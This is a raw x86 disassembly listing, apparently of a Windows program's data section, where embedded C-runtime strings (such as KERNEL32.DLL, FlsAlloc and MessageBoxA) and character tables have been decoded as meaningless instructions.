  40b8d7:	add    BYTE PTR [edx+0x8c00000],dl
  40b8dd:	add    BYTE PTR [eax],al
  40b8df:	add    BYTE PTR [eax],al
  40b8e1:	add    BYTE PTR [eax],al
  40b8e3:	add    BYTE PTR [ebx+0x8c00000],dl
  40b8e9:	add    BYTE PTR [eax],al
  40b8eb:	add    BYTE PTR [eax],al
  40b8ed:	add    BYTE PTR [eax],al
  40b8ef:	add    BYTE PTR [ebp+0x6e],al
  40b8f2:	arpl   WORD PTR [edi+0x64],bp
  40b8f5:	gs push eax
  40b8f7:	outs   dx,DWORD PTR ds:[esi]
  40b8f8:	imul   ebp,DWORD PTR [esi+0x74],0x7265
  40b8ff:	add    BYTE PTR [ebx+0x0],cl
  40b902:	inc    ebp
  40b903:	add    BYTE PTR [edx+0x0],dl
  40b906:	dec    esi
  40b907:	add    BYTE PTR [ebp+0x0],al
  40b90a:	dec    esp
  40b90b:	add    BYTE PTR [ebx],dh
  40b90d:	add    BYTE PTR [edx],dh
  40b90f:	add    BYTE PTR [esi],ch
  40b911:	add    BYTE PTR [eax+eax*1+0x4c],al
  40b915:	add    BYTE PTR [eax+eax*1+0x0],cl
  40b919:	add    BYTE PTR [eax],al
  40b91b:	add    BYTE PTR [ebp+eiz*2+0x63],al
  40b91f:	outs   dx,DWORD PTR ds:[esi]
  40b920:	fs gs push eax
  40b923:	outs   dx,DWORD PTR ds:[esi]
  40b924:	imul   ebp,DWORD PTR [esi+0x74],0x7265
  40b92b:	add    BYTE PTR [esi+0x6c],al
  40b92e:	jae    0x40b976
  40b930:	jb     0x40b997
  40b932:	add    BYTE PTR gs:[esi+0x6c],al
  40b936:	jae    0x40b98b
  40b938:	gs je  0x40b991
  40b93b:	popa   
  40b93c:	ins    BYTE PTR es:[edi],dx
  40b93d:	jne    0x40b9a4
  40b93f:	add    BYTE PTR [esi+0x6c],al
  40b942:	jae    0x40b98b
  40b944:	gs je  0x40b99d
  40b947:	popa   
  40b948:	ins    BYTE PTR es:[edi],dx
  40b949:	jne    0x40b9b0
  40b94b:	add    BYTE PTR [esi+0x6c],al
  40b94e:	jae    0x40b991
  40b950:	ins    BYTE PTR es:[edi],dx
  40b951:	ins    BYTE PTR es:[edi],dx
  40b952:	outs   dx,DWORD PTR ds:[esi]
  40b953:	arpl   WORD PTR [eax],ax
  40b955:	add    BYTE PTR [eax],al
  40b957:	add    BYTE PTR [ecx],al
  40b959:	add    al,BYTE PTR [ebx]
  40b95b:	add    al,0x5
  40b95d:	push   es
  40b95e:	pop    es
  40b95f:	or     BYTE PTR [ecx],cl
  40b961:	or     cl,BYTE PTR [ebx]
  40b963:	or     al,0xd
  40b965:	push   cs
  40b966:	movups xmm2,XMMWORD PTR [ecx]
  40b969:	adc    dl,BYTE PTR [ebx]
  40b96b:	adc    al,0x15
  40b96d:	push   ss
  40b96e:	pop    ss
  40b96f:	sbb    BYTE PTR [ecx],bl
  40b971:	sbb    bl,BYTE PTR [ebx]
  40b973:	sbb    al,0x1d
  40b975:	push   ds
  40b976:	pop    ds
  40b977:	and    BYTE PTR [ecx],ah
  40b979:	and    ah,BYTE PTR [ebx]
  40b97b:	and    al,0x25
  40b97d:	es daa 
  40b97f:	sub    BYTE PTR [ecx],ch
  40b981:	sub    ch,BYTE PTR [ebx]
  40b983:	sub    al,0x2d
  40b985:	cs das 
  40b987:	xor    BYTE PTR [ecx],dh
  40b989:	xor    dh,BYTE PTR [ebx]
  40b98b:	xor    al,0x35
  40b98d:	ss aaa 
  40b98f:	cmp    BYTE PTR [ecx],bh
  40b991:	cmp    bh,BYTE PTR [ebx]
  40b993:	cmp    al,0x3d
  40b995:	ds aas 
  40b997:	inc    eax
  40b998:	inc    ecx
  40b999:	inc    edx
  40b99a:	inc    ebx
  40b99b:	inc    esp
  40b99c:	inc    ebp
  40b99d:	inc    esi
  40b99e:	inc    edi
  40b99f:	dec    eax
  40b9a0:	dec    ecx
  40b9a1:	dec    edx
  40b9a2:	dec    ebx
  40b9a3:	dec    esp
  40b9a4:	dec    ebp
  40b9a5:	dec    esi
  40b9a6:	dec    edi
  40b9a7:	push   eax
  40b9a8:	push   ecx
  40b9a9:	push   edx
  40b9aa:	push   ebx
  40b9ab:	push   esp
  40b9ac:	push   ebp
  40b9ad:	push   esi
  40b9ae:	push   edi
  40b9af:	pop    eax
  40b9b0:	pop    ecx
  40b9b1:	pop    edx
  40b9b2:	pop    ebx
  40b9b3:	pop    esp
  40b9b4:	pop    ebp
  40b9b5:	pop    esi
  40b9b6:	pop    edi
  40b9b7:	pusha  
  40b9b8:	popa   
  40b9b9:	bound  esp,QWORD PTR [ebx+0x64]
  40b9bc:	gs addr16 pushw 0x6a69
  40b9c2:	imul   ebp,DWORD PTR [ebp+ebp*2+0x6e],0x6f
  40b9c7:	jo     0x40ba3a
  40b9c9:	jb     0x40ba3e
  40b9cb:	je     0x40ba42
  40b9cd:	jbe    0x40ba46
  40b9cf:	js     0x40ba4a
  40b9d1:	jp     0x40ba4e
  40b9d3:	jl     0x40ba52
  40b9d5:	jle    0x40ba56
  40b9d7:	add    BYTE PTR [eax],ch
  40b9d9:	add    BYTE PTR [esi+0x0],ch
  40b9dc:	jne    0x40b9de
  40b9de:	ins    BYTE PTR es:[edi],dx
  40b9df:	add    BYTE PTR [eax+eax*1+0x29],ch
  40b9e3:	add    BYTE PTR [eax],al
  40b9e5:	add    BYTE PTR [eax],al
  40b9e7:	add    BYTE PTR [eax],ch
  40b9e9:	outs   dx,BYTE PTR ds:[esi]
  40b9ea:	jne    0x40ba58
  40b9ec:	ins    BYTE PTR es:[edi],dx
  40b9ed:	sub    DWORD PTR [eax],eax
  40b9ef:	add    BYTE PTR [esi],al
  40b9f1:	add    BYTE PTR [eax],al
  40b9f3:	push   es
  40b9f4:	add    BYTE PTR [ecx],al
  40b9f6:	add    BYTE PTR [eax],al
  40b9f8:	adc    BYTE PTR [eax],al
  40b9fa:	add    eax,DWORD PTR [esi]
  40b9fc:	add    BYTE PTR [esi],al
  40b9fe:	add    dl,BYTE PTR [eax]
  40ba00:	add    al,0x45
  40ba02:	inc    ebp
  40ba03:	inc    ebp
  40ba04:	add    eax,0x5050505
  40ba09:	xor    eax,0x500030
  40ba0e:	add    BYTE PTR [eax],al
  40ba10:	add    BYTE PTR [eax],ch
  40ba12:	and    BYTE PTR [eax],bh
  40ba14:	push   eax
  40ba15:	pop    eax
  40ba16:	pop    es
  40ba17:	or     BYTE PTR [eax],al
  40ba19:	aaa    
  40ba1a:	xor    BYTE PTR [eax],dh
  40ba1c:	push   edi
  40ba1d:	push   eax
  40ba1e:	pop    es
  40ba1f:	add    BYTE PTR [eax],al
  40ba21:	and    BYTE PTR [eax],ah
  40ba23:	or     BYTE PTR [eax],al
  40ba25:	add    BYTE PTR [eax],al
  40ba27:	add    BYTE PTR [eax],cl
  40ba29:	pusha  
  40ba2a:	push   0x60606060
  40ba2f:	add    BYTE PTR [eax],al
  40ba31:	js     0x40baa3
  40ba33:	js     0x40baad
  40ba35:	js     0x40baaf
  40ba37:	or     BYTE PTR [edi],al
  40ba39:	or     BYTE PTR [eax],al
  40ba3b:	add    BYTE PTR [edi],al
  40ba3d:	add    BYTE PTR [eax],cl
  40ba3f:	or     BYTE PTR [eax],cl
  40ba41:	add    BYTE PTR [eax],al
  40ba43:	or     BYTE PTR [eax],al
  40ba45:	or     BYTE PTR [eax],al
  40ba47:	pop    es
  40ba48:	or     BYTE PTR [eax],al
  40ba4a:	add    BYTE PTR [eax],al
  40ba4c:	inc    edi
  40ba4d:	gs je  0x40baa0
  40ba50:	jb     0x40bac1
  40ba52:	arpl   WORD PTR [ebp+0x73],sp
  40ba55:	jae    0x40baae
  40ba57:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40ba5e:	popa   
  40ba5f:	je     0x40baca
  40ba61:	outs   dx,DWORD PTR ds:[esi]
  40ba62:	outs   dx,BYTE PTR ds:[esi]
  40ba63:	add    BYTE PTR [edi+0x65],al
  40ba66:	je     0x40babd
  40ba68:	jae    0x40bacf
  40ba6a:	jb     0x40babb
  40ba6c:	bound  ebp,QWORD PTR [edx+0x65]
  40ba6f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  40ba73:	outs   dx,WORD PTR ds:[esi]
  40ba75:	jb     0x40bae4
  40ba77:	popa   
  40ba78:	je     0x40bae3
  40ba7a:	outs   dx,DWORD PTR ds:[esi]
  40ba7b:	outs   dx,BYTE PTR ds:[esi]
  40ba7c:	inc    ecx
  40ba7d:	add    BYTE PTR [eax],al
  40ba7f:	add    BYTE PTR [edi+0x65],al
  40ba82:	je     0x40bad0
  40ba84:	popa   
  40ba85:	jae    0x40bafb
  40ba87:	inc    ecx
  40ba88:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40ba8c:	gs push eax
  40ba8e:	outs   dx,DWORD PTR ds:[esi]
  40ba8f:	jo     0x40bb06
  40ba91:	jo     0x40ba93
  40ba93:	add    BYTE PTR [edi+0x65],al
  40ba96:	je     0x40bad9
  40ba98:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40ba9c:	gs push edi
  40ba9e:	imul   ebp,DWORD PTR [esi+0x64],0x4d00776f
  40baa5:	gs jae 0x40bb1b
  40baa8:	popa   
  40baa9:	addr16 gs inc edx
  40baac:	outs   dx,DWORD PTR ds:[esi]
  40baad:	js     0x40baf0
  40baaf:	add    BYTE PTR [ebp+0x53],dl
  40bab2:	inc    ebp
  40bab3:	push   edx
  40bab4:	xor    esi,DWORD PTR [edx]
  40bab6:	cs inc esp
  40bab8:	dec    esp
  40bab9:	dec    esp
	...
  40bbbe:	add    BYTE PTR [eax],al
  40bbc0:	and    BYTE PTR [eax],al
  40bbc2:	and    BYTE PTR [eax],al
  40bbc4:	and    BYTE PTR [eax],al
  40bbc6:	and    BYTE PTR [eax],al
  40bbc8:	and    BYTE PTR [eax],al
  40bbca:	and    BYTE PTR [eax],al
  40bbcc:	and    BYTE PTR [eax],al
  40bbce:	and    BYTE PTR [eax],al
  40bbd0:	and    BYTE PTR [eax],al
  40bbd2:	sub    BYTE PTR [eax],al
  40bbd4:	sub    BYTE PTR [eax],al
  40bbd6:	sub    BYTE PTR [eax],al
  40bbd8:	sub    BYTE PTR [eax],al
  40bbda:	sub    BYTE PTR [eax],al
  40bbdc:	and    BYTE PTR [eax],al
  40bbde:	and    BYTE PTR [eax],al
  40bbe0:	and    BYTE PTR [eax],al
  40bbe2:	and    BYTE PTR [eax],al
  40bbe4:	and    BYTE PTR [eax],al
  40bbe6:	and    BYTE PTR [eax],al
  40bbe8:	and    BYTE PTR [eax],al
  40bbea:	and    BYTE PTR [eax],al
  40bbec:	and    BYTE PTR [eax],al
  40bbee:	and    BYTE PTR [eax],al
  40bbf0:	and    BYTE PTR [eax],al
  40bbf2:	and    BYTE PTR [eax],al
  40bbf4:	and    BYTE PTR [eax],al
  40bbf6:	and    BYTE PTR [eax],al
  40bbf8:	and    BYTE PTR [eax],al
  40bbfa:	and    BYTE PTR [eax],al
  40bbfc:	and    BYTE PTR [eax],al
  40bbfe:	and    BYTE PTR [eax],al
  40bc00:	dec    eax
  40bc01:	add    BYTE PTR [eax],dl
  40bc03:	add    BYTE PTR [eax],dl
  40bc05:	add    BYTE PTR [eax],dl
  40bc07:	add    BYTE PTR [eax],dl
  40bc09:	add    BYTE PTR [eax],dl
  40bc0b:	add    BYTE PTR [eax],dl
  40bc0d:	add    BYTE PTR [eax],dl
  40bc0f:	add    BYTE PTR [eax],dl
  40bc11:	add    BYTE PTR [eax],dl
  40bc13:	add    BYTE PTR [eax],dl
  40bc15:	add    BYTE PTR [eax],dl
  40bc17:	add    BYTE PTR [eax],dl
  40bc19:	add    BYTE PTR [eax],dl
  40bc1b:	add    BYTE PTR [eax],dl
  40bc1d:	add    BYTE PTR [eax],dl
  40bc1f:	add    BYTE PTR [eax+eax*1+0x840084],al
  40bc26:	test   BYTE PTR [eax],al
  40bc28:	test   BYTE PTR [eax],al
  40bc2a:	test   BYTE PTR [eax],al
  40bc2c:	test   BYTE PTR [eax],al
  40bc2e:	test   BYTE PTR [eax],al
  40bc30:	test   BYTE PTR [eax],al
  40bc32:	test   BYTE PTR [eax],al
  40bc34:	adc    BYTE PTR [eax],al
  40bc36:	adc    BYTE PTR [eax],al
  40bc38:	adc    BYTE PTR [eax],al
  40bc3a:	adc    BYTE PTR [eax],al
  40bc3c:	adc    BYTE PTR [eax],al
  40bc3e:	adc    BYTE PTR [eax],al
  40bc40:	adc    BYTE PTR [eax],al
  40bc42:	add    DWORD PTR [eax],0x810081
  40bc48:	add    DWORD PTR [eax],0x810081
  40bc4e:	add    DWORD PTR [eax],eax
  40bc50:	add    DWORD PTR [eax],eax
  40bc52:	add    DWORD PTR [eax],eax
  40bc54:	add    DWORD PTR [eax],eax
  40bc56:	add    DWORD PTR [eax],eax
  40bc58:	add    DWORD PTR [eax],eax
  40bc5a:	add    DWORD PTR [eax],eax
  40bc5c:	add    DWORD PTR [eax],eax
  40bc5e:	add    DWORD PTR [eax],eax
  40bc60:	add    DWORD PTR [eax],eax
  40bc62:	add    DWORD PTR [eax],eax
  40bc64:	add    DWORD PTR [eax],eax
  40bc66:	add    DWORD PTR [eax],eax
  40bc68:	add    DWORD PTR [eax],eax
  40bc6a:	add    DWORD PTR [eax],eax
  40bc6c:	add    DWORD PTR [eax],eax
  40bc6e:	add    DWORD PTR [eax],eax
  40bc70:	add    DWORD PTR [eax],eax
  40bc72:	add    DWORD PTR [eax],eax
  40bc74:	add    DWORD PTR [eax],eax
  40bc76:	adc    BYTE PTR [eax],al
  40bc78:	adc    BYTE PTR [eax],al
  40bc7a:	adc    BYTE PTR [eax],al
  40bc7c:	adc    BYTE PTR [eax],al
  40bc7e:	adc    BYTE PTR [eax],al
  40bc80:	adc    BYTE PTR [eax],al
  40bc82:	add    BYTE PTR [eax],0x82
  40bc85:	add    BYTE PTR [edx-0x7dff7e00],al
  40bc8b:	add    BYTE PTR [edx+0x2000200],al
  40bc91:	add    BYTE PTR [edx],al
  40bc93:	add    BYTE PTR [edx],al
  40bc95:	add    BYTE PTR [edx],al
  40bc97:	add    BYTE PTR [edx],al
  40bc99:	add    BYTE PTR [edx],al
  40bc9b:	add    BYTE PTR [edx],al
  40bc9d:	add    BYTE PTR [edx],al
  40bc9f:	add    BYTE PTR [edx],al
  40bca1:	add    BYTE PTR [edx],al
  40bca3:	add    BYTE PTR [edx],al
  40bca5:	add    BYTE PTR [edx],al
  40bca7:	add    BYTE PTR [edx],al
  40bca9:	add    BYTE PTR [edx],al
  40bcab:	add    BYTE PTR [edx],al
  40bcad:	add    BYTE PTR [edx],al
  40bcaf:	add    BYTE PTR [edx],al
  40bcb1:	add    BYTE PTR [edx],al
  40bcb3:	add    BYTE PTR [edx],al
  40bcb5:	add    BYTE PTR [eax],dl
  40bcb7:	add    BYTE PTR [eax],dl
  40bcb9:	add    BYTE PTR [eax],dl
  40bcbb:	add    BYTE PTR [eax],dl
  40bcbd:	add    BYTE PTR [eax],ah
	...
  40bdbf:	add    BYTE PTR [eax],al
  40bdc1:	add    BYTE PTR [eax],ah
  40bdc3:	add    BYTE PTR [eax],ah
  40bdc5:	add    BYTE PTR [eax],ah
  40bdc7:	add    BYTE PTR [eax],ah
  40bdc9:	add    BYTE PTR [eax],ah
  40bdcb:	add    BYTE PTR [eax],ah
  40bdcd:	add    BYTE PTR [eax],ah
  40bdcf:	add    BYTE PTR [eax],ah
  40bdd1:	add    BYTE PTR [eax],ah
  40bdd3:	add    BYTE PTR [eax+0x0],ch
  40bdd6:	sub    BYTE PTR [eax],al
  40bdd8:	sub    BYTE PTR [eax],al
  40bdda:	sub    BYTE PTR [eax],al
  40bddc:	sub    BYTE PTR [eax],al
  40bdde:	and    BYTE PTR [eax],al
  40bde0:	and    BYTE PTR [eax],al
  40bde2:	and    BYTE PTR [eax],al
  40bde4:	and    BYTE PTR [eax],al
  40bde6:	and    BYTE PTR [eax],al
  40bde8:	and    BYTE PTR [eax],al
  40bdea:	and    BYTE PTR [eax],al
  40bdec:	and    BYTE PTR [eax],al
  40bdee:	and    BYTE PTR [eax],al
  40bdf0:	and    BYTE PTR [eax],al
  40bdf2:	and    BYTE PTR [eax],al
  40bdf4:	and    BYTE PTR [eax],al
  40bdf6:	and    BYTE PTR [eax],al
  40bdf8:	and    BYTE PTR [eax],al
  40bdfa:	and    BYTE PTR [eax],al
  40bdfc:	and    BYTE PTR [eax],al
  40bdfe:	and    BYTE PTR [eax],al
  40be00:	and    BYTE PTR [eax],al
  40be02:	dec    eax
  40be03:	add    BYTE PTR [eax],dl
  40be05:	add    BYTE PTR [eax],dl
  40be07:	add    BYTE PTR [eax],dl
  40be09:	add    BYTE PTR [eax],dl
  40be0b:	add    BYTE PTR [eax],dl
  40be0d:	add    BYTE PTR [eax],dl
  40be0f:	add    BYTE PTR [eax],dl
  40be11:	add    BYTE PTR [eax],dl
  40be13:	add    BYTE PTR [eax],dl
  40be15:	add    BYTE PTR [eax],dl
  40be17:	add    BYTE PTR [eax],dl
  40be19:	add    BYTE PTR [eax],dl
  40be1b:	add    BYTE PTR [eax],dl
  40be1d:	add    BYTE PTR [eax],dl
  40be1f:	add    BYTE PTR [eax],dl
  40be21:	add    BYTE PTR [eax+eax*1+0x840084],al
  40be28:	test   BYTE PTR [eax],al
  40be2a:	test   BYTE PTR [eax],al
  40be2c:	test   BYTE PTR [eax],al
  40be2e:	test   BYTE PTR [eax],al
  40be30:	test   BYTE PTR [eax],al
  40be32:	test   BYTE PTR [eax],al
  40be34:	test   BYTE PTR [eax],al
  40be36:	adc    BYTE PTR [eax],al
  40be38:	adc    BYTE PTR [eax],al
  40be3a:	adc    BYTE PTR [eax],al
  40be3c:	adc    BYTE PTR [eax],al
  40be3e:	adc    BYTE PTR [eax],al
  40be40:	adc    BYTE PTR [eax],al
  40be42:	adc    BYTE PTR [eax],al
  40be44:	add    DWORD PTR [ecx],0x1810181
  40be4a:	add    DWORD PTR [ecx],0x1810181
  40be50:	add    DWORD PTR [ecx],eax
  40be52:	add    DWORD PTR [ecx],eax
  40be54:	add    DWORD PTR [ecx],eax
  40be56:	add    DWORD PTR [ecx],eax
  40be58:	add    DWORD PTR [ecx],eax
  40be5a:	add    DWORD PTR [ecx],eax
  40be5c:	add    DWORD PTR [ecx],eax
  40be5e:	add    DWORD PTR [ecx],eax
  40be60:	add    DWORD PTR [ecx],eax
  40be62:	add    DWORD PTR [ecx],eax
  40be64:	add    DWORD PTR [ecx],eax
  40be66:	add    DWORD PTR [ecx],eax
  40be68:	add    DWORD PTR [ecx],eax
  40be6a:	add    DWORD PTR [ecx],eax
  40be6c:	add    DWORD PTR [ecx],eax
  40be6e:	add    DWORD PTR [ecx],eax
  40be70:	add    DWORD PTR [ecx],eax
  40be72:	add    DWORD PTR [ecx],eax
  40be74:	add    DWORD PTR [ecx],eax
  40be76:	add    DWORD PTR [ecx],eax
  40be78:	adc    BYTE PTR [eax],al
  40be7a:	adc    BYTE PTR [eax],al
  40be7c:	adc    BYTE PTR [eax],al
  40be7e:	adc    BYTE PTR [eax],al
  40be80:	adc    BYTE PTR [eax],al
  40be82:	adc    BYTE PTR [eax],al
  40be84:	add    BYTE PTR [ecx],0x82
  40be87:	add    DWORD PTR [edx-0x7dfe7dff],eax
  40be8d:	add    DWORD PTR [edx+0x2010201],eax
  40be93:	add    DWORD PTR [edx],eax
  40be95:	add    DWORD PTR [edx],eax
  40be97:	add    DWORD PTR [edx],eax
  40be99:	add    DWORD PTR [edx],eax
  40be9b:	add    DWORD PTR [edx],eax
  40be9d:	add    DWORD PTR [edx],eax
  40be9f:	add    DWORD PTR [edx],eax
  40bea1:	add    DWORD PTR [edx],eax
  40bea3:	add    DWORD PTR [edx],eax
  40bea5:	add    DWORD PTR [edx],eax
  40bea7:	add    DWORD PTR [edx],eax
  40bea9:	add    DWORD PTR [edx],eax
  40beab:	add    DWORD PTR [edx],eax
  40bead:	add    DWORD PTR [edx],eax
  40beaf:	add    DWORD PTR [edx],eax
  40beb1:	add    DWORD PTR [edx],eax
  40beb3:	add    DWORD PTR [edx],eax
  40beb5:	add    DWORD PTR [edx],eax
  40beb7:	add    DWORD PTR [eax],edx
  40beb9:	add    BYTE PTR [eax],dl
  40bebb:	add    BYTE PTR [eax],dl
  40bebd:	add    BYTE PTR [eax],dl
  40bebf:	add    BYTE PTR [eax],ah
  40bec1:	add    BYTE PTR [eax],ah
  40bec3:	add    BYTE PTR [eax],ah
  40bec5:	add    BYTE PTR [eax],ah
  40bec7:	add    BYTE PTR [eax],ah
  40bec9:	add    BYTE PTR [eax],ah
  40becb:	add    BYTE PTR [eax],ah
  40becd:	add    BYTE PTR [eax],ah
  40becf:	add    BYTE PTR [eax],ah
  40bed1:	add    BYTE PTR [eax],ah
  40bed3:	add    BYTE PTR [eax],ah
  40bed5:	add    BYTE PTR [eax],ah
  40bed7:	add    BYTE PTR [eax],ah
  40bed9:	add    BYTE PTR [eax],ah
  40bedb:	add    BYTE PTR [eax],ah
  40bedd:	add    BYTE PTR [eax],ah
  40bedf:	add    BYTE PTR [eax],ah
  40bee1:	add    BYTE PTR [eax],ah
  40bee3:	add    BYTE PTR [eax],ah
  40bee5:	add    BYTE PTR [eax],ah
  40bee7:	add    BYTE PTR [eax],ah
  40bee9:	add    BYTE PTR [eax],ah
  40beeb:	add    BYTE PTR [eax],ah
  40beed:	add    BYTE PTR [eax],ah
  40beef:	add    BYTE PTR [eax],ah
  40bef1:	add    BYTE PTR [eax],ah
  40bef3:	add    BYTE PTR [eax],ah
  40bef5:	add    BYTE PTR [eax],ah
  40bef7:	add    BYTE PTR [eax],ah
  40bef9:	add    BYTE PTR [eax],ah
  40befb:	add    BYTE PTR [eax],ah
  40befd:	add    BYTE PTR [eax],ah
  40beff:	add    BYTE PTR [eax],ah
  40bf01:	add    BYTE PTR [eax+0x0],cl
  40bf04:	adc    BYTE PTR [eax],al
  40bf06:	adc    BYTE PTR [eax],al
  40bf08:	adc    BYTE PTR [eax],al
  40bf0a:	adc    BYTE PTR [eax],al
  40bf0c:	adc    BYTE PTR [eax],al
  40bf0e:	adc    BYTE PTR [eax],al
  40bf10:	adc    BYTE PTR [eax],al
  40bf12:	adc    BYTE PTR [eax],al
  40bf14:	adc    BYTE PTR [eax],al
  40bf16:	adc    BYTE PTR [eax],al
  40bf18:	adc    BYTE PTR [eax],al
  40bf1a:	adc    BYTE PTR [eax],al
  40bf1c:	adc    BYTE PTR [eax],al
  40bf1e:	adc    BYTE PTR [eax],al
  40bf20:	adc    BYTE PTR [eax],al
  40bf22:	adc    BYTE PTR [eax],al
  40bf24:	adc    BYTE PTR [eax],al
  40bf26:	adc    al,0x0
  40bf28:	adc    al,0x0
  40bf2a:	adc    BYTE PTR [eax],al
  40bf2c:	adc    BYTE PTR [eax],al
  40bf2e:	adc    BYTE PTR [eax],al
  40bf30:	adc    BYTE PTR [eax],al
  40bf32:	adc    BYTE PTR [eax],al
  40bf34:	adc    al,0x0
  40bf36:	adc    BYTE PTR [eax],al
  40bf38:	adc    BYTE PTR [eax],al
  40bf3a:	adc    BYTE PTR [eax],al
  40bf3c:	adc    BYTE PTR [eax],al
  40bf3e:	adc    BYTE PTR [eax],al
  40bf40:	adc    BYTE PTR [eax],al
  40bf42:	add    DWORD PTR [ecx],eax
  40bf44:	add    DWORD PTR [ecx],eax
  40bf46:	add    DWORD PTR [ecx],eax
  40bf48:	add    DWORD PTR [ecx],eax
  40bf4a:	add    DWORD PTR [ecx],eax
  40bf4c:	add    DWORD PTR [ecx],eax
  40bf4e:	add    DWORD PTR [ecx],eax
  40bf50:	add    DWORD PTR [ecx],eax
  40bf52:	add    DWORD PTR [ecx],eax
  40bf54:	add    DWORD PTR [ecx],eax
  40bf56:	add    DWORD PTR [ecx],eax
  40bf58:	add    DWORD PTR [ecx],eax
  40bf5a:	add    DWORD PTR [ecx],eax
  40bf5c:	add    DWORD PTR [ecx],eax
  40bf5e:	add    DWORD PTR [ecx],eax
  40bf60:	add    DWORD PTR [ecx],eax
  40bf62:	add    DWORD PTR [ecx],eax
  40bf64:	add    DWORD PTR [ecx],eax
  40bf66:	add    DWORD PTR [ecx],eax
  40bf68:	add    DWORD PTR [ecx],eax
  40bf6a:	add    DWORD PTR [ecx],eax
  40bf6c:	add    DWORD PTR [ecx],eax
  40bf6e:	add    DWORD PTR [ecx],eax
  40bf70:	adc    BYTE PTR [eax],al
  40bf72:	add    DWORD PTR [ecx],eax
  40bf74:	add    DWORD PTR [ecx],eax
  40bf76:	add    DWORD PTR [ecx],eax
  40bf78:	add    DWORD PTR [ecx],eax
  40bf7a:	add    DWORD PTR [ecx],eax
  40bf7c:	add    DWORD PTR [ecx],eax
  40bf7e:	add    DWORD PTR [ecx],eax
  40bf80:	add    al,BYTE PTR [ecx]
  40bf82:	add    al,BYTE PTR [ecx]
  40bf84:	add    al,BYTE PTR [ecx]
  40bf86:	add    al,BYTE PTR [ecx]
  40bf88:	add    al,BYTE PTR [ecx]
  40bf8a:	add    al,BYTE PTR [ecx]
  40bf8c:	add    al,BYTE PTR [ecx]
  40bf8e:	add    al,BYTE PTR [ecx]
  40bf90:	add    al,BYTE PTR [ecx]
  40bf92:	add    al,BYTE PTR [ecx]
  40bf94:	add    al,BYTE PTR [ecx]
  40bf96:	add    al,BYTE PTR [ecx]
  40bf98:	add    al,BYTE PTR [ecx]
  40bf9a:	add    al,BYTE PTR [ecx]
  40bf9c:	add    al,BYTE PTR [ecx]
  40bf9e:	add    al,BYTE PTR [ecx]
  40bfa0:	add    al,BYTE PTR [ecx]
  40bfa2:	add    al,BYTE PTR [ecx]
  40bfa4:	add    al,BYTE PTR [ecx]
  40bfa6:	add    al,BYTE PTR [ecx]
  40bfa8:	add    al,BYTE PTR [ecx]
  40bfaa:	add    al,BYTE PTR [ecx]
  40bfac:	add    al,BYTE PTR [ecx]
  40bfae:	add    al,BYTE PTR [ecx]
  40bfb0:	adc    BYTE PTR [eax],al
  40bfb2:	add    al,BYTE PTR [ecx]
  40bfb4:	add    al,BYTE PTR [ecx]
  40bfb6:	add    al,BYTE PTR [ecx]
  40bfb8:	add    al,BYTE PTR [ecx]
  40bfba:	add    al,BYTE PTR [ecx]
  40bfbc:	add    al,BYTE PTR [ecx]
  40bfbe:	add    al,BYTE PTR [ecx]
  40bfc0:	add    al,BYTE PTR [ecx]
  40bfc2:	add    DWORD PTR [ecx],eax
  40bfc4:	add    BYTE PTR [eax],al
  40bfc6:	add    BYTE PTR [eax],al
  40bfc8:	add    BYTE PTR [ecx-0x7a7b7c7e],0x86
  40bfcf:	xchg   DWORD PTR [eax-0x73747577],ecx
  40bfd5:	lea    ecx,[esi-0x6d6e6f71]
  40bfdb:	xchg   ebx,eax
  40bfdc:	xchg   esp,eax
  40bfdd:	xchg   ebp,eax
  40bfde:	xchg   esi,eax
  40bfdf:	xchg   edi,eax
  40bfe0:	cwde   
  40bfe1:	cdq    
  40bfe2:	call   0xa09f:0x9e9d9c9b
  40bfe9:	mov    eax,ds:0xa5a4a3a2
  40bfee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff0:	test   al,0xa9
  40bff2:	stos   BYTE PTR es:[edi],al
  40bff3:	stos   DWORD PTR es:[edi],eax
  40bff4:	lods   al,BYTE PTR ds:[esi]
  40bff5:	lods   eax,DWORD PTR ds:[esi]
  40bff6:	scas   al,BYTE PTR es:[edi]
  40bff7:	scas   eax,DWORD PTR es:[edi]
  40bff8:	mov    al,0xb1
  40bffa:	mov    dl,0xb3
  40bffc:	mov    ah,0xb5
  40bffe:	mov    dh,0xb7
  40c000:	mov    eax,0xbcbbbab9
  40c005:	mov    ebp,0xc1c0bfbe
  40c00a:	ret    0xc4c3
  40c00d:	(bad)
  40c010:	enter  0xcac9,0xcb
  40c014:	int3   
  40c015:	int    0xce
  40c017:	iret   
  40c018:	rcl    cl,1
  40c01a:	rcl    bl,cl
  40c01c:	aam    0xd5
  40c01e:	(bad)  
  40c01f:	xlat   BYTE PTR ds:[ebx]
  40c020:	fcomp  st(1)
  40c022:	fcmovu st,st(3)
  40c024:	(bad)  
  40c026:	(bad)  
  40c028:	loopne 0x40c00b
  40c02a:	loop   0x40c00f
  40c02c:	in     al,0xe5
  40c02e:	out    0xe7,al
  40c030:	call   0xed2cab1e
  40c035:	in     eax,dx
  40c036:	out    dx,al
  40c037:	out    dx,eax
  40c038:	lock icebp 
  40c03a:	repnz repz hlt 
  40c03d:	cmc    
  40c03e:	div    bh
  40c040:	clc    
  40c041:	stc    
  40c042:	cli    
  40c043:	sti    
  40c044:	cld    
  40c045:	std    
  40c046:	(bad)  
  40c047:	inc    DWORD PTR [eax]
  40c049:	add    DWORD PTR [edx],eax
  40c04b:	add    eax,DWORD PTR [eax*1+0x9080706]
  40c052:	or     cl,BYTE PTR [ebx]
  40c054:	or     al,0xd
  40c056:	push   cs
  40c057:	movups xmm2,XMMWORD PTR [ecx]
  40c05a:	adc    dl,BYTE PTR [ebx]
  40c05c:	adc    al,0x15
  40c05e:	push   ss
  40c05f:	pop    ss
  40c060:	sbb    BYTE PTR [ecx],bl
  40c062:	sbb    bl,BYTE PTR [ebx]
  40c064:	sbb    al,0x1d
  40c066:	push   ds
  40c067:	pop    ds
  40c068:	and    BYTE PTR [ecx],ah
  40c06a:	and    ah,BYTE PTR [ebx]
  40c06c:	and    al,0x25
  40c06e:	es daa 
  40c070:	sub    BYTE PTR [ecx],ch
  40c072:	sub    ch,BYTE PTR [ebx]
  40c074:	sub    al,0x2d
  40c076:	cs das 
  40c078:	xor    BYTE PTR [ecx],dh
